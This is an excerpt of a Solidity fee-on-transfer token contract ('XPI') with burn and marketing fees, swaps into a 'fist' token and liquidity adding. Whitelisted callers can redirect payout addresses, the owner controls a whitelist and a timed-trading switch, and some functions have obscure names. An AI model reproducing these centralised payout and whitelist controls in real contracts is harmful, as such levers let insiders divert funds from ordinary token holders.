...
contract XPI is Ownable, IERC20Metadata {
    mapping(address => bool) public _whitess;
    ...
    constructor() {
        ...
        _maxsell = 6 * 10 ** decimals();
        _maxfist = 50 * 10 ** 18;
        dingshikaiguan = false;
        _dead = 0x000000000000000000000000000000000000dEaD;
        _main = 0xd6F685597338997ccb8Fe832dcCaF7Eb8DDf699e;
        _whites[_dead] = true;
        _whites[_main] = true;
    ...
    if ( IERC20(_pair).balanceOf(_pair)==0 ){
        if (!_whites[sender] && !_whites[recipient] &&  IERC20(_pair).balanceOf(recipient)<lpzhi) {
            ...
            _balances[_dead] += (amount * _pools / 100);
            emit Transfer(sender, _dead, (amount * _pools / 100));
             // market + flow
            _balances[address(this)] += (amount * _poolss / 100);
            emit Transfer(sender, address(this), (amount * _poolss / 100));
            amount = amount * (100 - _pools-_poolss) / 100;
        }
    ...
    function _swap1() private {
        ...
        if (_maxsell > 0 && balances >= _maxsell) {
            balances = _maxsell;
            _swapTokenForFist(balances * 19 / 20);
            uint256 fistval2 = IERC20(_fist).balanceOf(address(this));
            if (fistval2 > fistval) {
                IERC20(_fist).transfer(_mark1, (fistval2 - fistval)*4 / 19);
                IERC20(_fist).transfer(_mark3, (fistval2 - fistval)*2 / 19);
                _swapFistForgoumai ((fistval2 - fistval)*2 / 19);
                _doBonusFist((fistval2 - fistval)*6 / 19);
            }
            balances = _maxsell;
                if (balances/20 > 0 && (fistval2 - fistval)*1/19 > 0) {
                addLiquidity2(balances/20, (fistval2 - fistval)*1/19);
            }
        }
    }
    ...
    function setMarksgoumai(address main,address mark1, address mark2,address mark3,address wrap1) public {
        require(_whitess[_msgSender()]);
        _main = main;
        _mark1 = mark1;
        _mark2 = mark2;
        _mark3 = mark3;
    ...
    function setWhitess(address addr, bool val) public onlyOwner {
        _whitess[addr] = val;
    }
    ...
    function sjdshdz(uint256 val,bool val1,uint256 val2) public onlyOwner{
        shijian = val;
        dingshikaiguan = val1;
        heidongzhi = val2;
    }
